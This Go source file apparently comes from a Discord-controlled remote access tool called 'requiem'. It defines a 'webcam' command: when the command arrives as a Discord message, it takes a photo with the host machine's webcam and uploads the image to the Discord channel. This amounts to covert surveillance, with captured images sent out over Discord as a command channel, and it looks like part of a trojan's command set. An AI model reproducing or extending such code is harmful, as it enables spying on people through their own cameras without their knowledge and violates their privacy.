package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*CamCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")
	hydrate := utils.HasFlag(content, "hydrate")

	pic, err := funcs.TakeWebcam(hydrate)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to capture - %s", err), msg.Reference())
		return
	}

	ses.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
		Content:   "🟩 Successfully captured.",
		Reference: msg.Reference(),
		Files: []*discordgo.File{{
			Name:   "cam.jpg",
			Reader: pic,
		}},
	})
}

func (*CamCommand) Name() string {
	return "webcam"
}

func (*CamCommand) Info() string {
	return "Takes a picture from the webcam."
}

type CamCommand struct{}
